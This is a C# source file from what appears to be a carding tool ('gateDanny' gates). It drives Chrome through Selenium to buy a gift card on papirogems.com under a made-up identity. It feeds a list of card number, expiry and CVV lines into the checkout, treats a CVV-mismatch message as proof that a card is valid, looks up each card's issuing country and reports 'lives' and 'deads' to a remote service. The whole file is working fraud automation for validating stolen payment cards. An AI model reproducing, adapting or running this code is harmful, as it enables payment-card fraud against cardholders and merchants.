using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Papirogems
    {
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        check check = new check();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://papirogems.com/products/gift-card";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";
                Form1.circularProgressBar1.Value = 10;
                if (tiempoElemento(By.XPath("//*[@id='AddToCartForm--product-template']/div[5]/div/div/div/div/button[1]")))
                {
                    if (IsElementPresent(By.XPath("//*[@id='AddToCartForm--product-template']/div[5]/div/div/div/div/button[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]")).Displayed == true)
                        {
                            driver.FindElement(By.XPath("//*[@id='PopupSignupForm_0']/div[2]/div[1]")).Click();
                            Thread.Sleep(2000);
                        }
                    }

                    driver.FindElement(By.XPath("//*[@id='AddToCartForm--product-template']/div[5]/div/div/div/div/button[1]")).Click();
                    Thread.Sleep(1000);

                    if (tiempoElemento(By.XPath("//*[@id='checkout_email']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='checkout_email']")).SendKeys(correo);
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_first_name']")).SendKeys("JOSE");
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_last_name']")).SendKeys("REYES");
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_address1']")).SendKeys("/*2 Allen Street*/");
                       var country=new SelectElement( driver.FindElement(By.XPath("//*[@id='checkout_billing_address_country']")));
                        country.SelectByValue("United States");
                        Thread.Sleep(1000);
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_city']")).SendKeys("New York");
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_zip']")).SendKeys("10002");
                        var estate = new SelectElement(driver.FindElement(By.XPath("//*[@id='checkout_billing_address_province']")));
                        estate.SelectByValue("NY");
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='checkout_billing_address_phone']")).SendKeys("2135248796");
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='continue_button']")).Submit();
                        Thread.Sleep(1000);

                        if (tiempoElemento(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[1]/div/div[1]/iframe")))
                        {
                            Thread.Sleep(500);
                            pago();
                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }

                }
                else
                {
                    restart();
                }
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                 pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {

                
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 2)
                    {

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[1]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[1]/div/div[1]/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[1]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[1]/div/div[1]/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[1]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[1]/div/div[1]/iframe")));
                        }






                        Thread.Sleep(500);

                        for (var i = 0; i <= ccnum.Length - 1; i++)
                        {
                            
                            driver.FindElement(By.XPath("//*[@id='number']")).SendKeys(ccnum[i].ToString());
                            Thread.Sleep(300);
                        }

                        Thread.Sleep(300);
                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(500);
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[2]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[2]/div/div/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[2]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[2]/div/div/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[2]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[2]/div/div/iframe")));
                        }


                        
                        
                       
                        
                        
                        Thread.Sleep(500);

                        driver.FindElement(By.XPath("//*[@id='name']")).SendKeys("JOSEPH PANTON");
                       

                        Thread.Sleep(300);
                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(500);

                        
                         if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[4]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[4]/div/div/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[4]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[4]/div/div/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[4]/div/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[4]/div/div/iframe")));
                        }
                       
                        
                        Thread.Sleep(500);

                        var mes = ccLine[1];
                        for (var i = 0; i <= 1; i++)
                        {
                            driver.FindElement(By.XPath("//*[@id='expiry']")).SendKeys(mes[i].ToString());
                            Thread.Sleep(300);
                        }

                        var anio = ccLine[2].Remove(0, 2);
                        for (var i = 0; i <= 1; i++)
                        {
                            driver.FindElement(By.XPath("//*[@id='expiry']")).SendKeys(anio[i].ToString());
                            Thread.Sleep(300);
                        }

                        Thread.Sleep(300);
                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(500);

                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[5]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/fieldset/div[3]/div[3]/div[5]/div/div[1]/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[5]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[4]/div[5]/div/div[1]/iframe")));
                        }
                        if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[5]/div/div[1]/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/div[5]/div/div[1]/iframe")));
                        }

                        
                        Thread.Sleep(500);

                        driver.FindElement(By.XPath("//*[@id='verification_value']")).SendKeys(ccLine[3]);

                        Thread.Sleep(500);

                        driver.SwitchTo().ParentFrame();
                        Thread.Sleep(500);

                        driver.FindElement(By.XPath("//*[@id='continue_button']")).Submit();
                        Thread.Sleep(3000);

                        if (tiempoElemento(By.XPath("//*[@id='continue_button']")))
                        {

                            driver.FindElement(By.XPath("//*[@id='continue_button']")).Submit();
                            //try
                            //{
                            //    driver.ExecuteJavaScript("document.querySelector('#continue_button').click();");
                            //    Thread.Sleep(1000);
                            //}
                            //catch (Exception EX)
                            //{

                            //    Console.WriteLine(EX);
                            //}
                            Thread.Sleep(2000);
                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                restart();
            }

        }

         public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                    if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/div/p")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/div/p")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[2]/div/p")).Text.Trim() == "Security code was not matched by the processor")
                            {
                                estado = "live";
                            }
                            else
                            {
                                estado = "dead";
                            }
                        }
                    }

                }
                else
                {
                    estado = "live";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                if (IsElementPresent(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/a")))
                {
                    driver.FindElement(By.XPath("/html/body/div/div/div/main/div[1]/div/form/div[1]/div[2]/div[3]/fieldset/div[3]/div[3]/a")).Click();

                }
                Thread.Sleep(1000);
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}



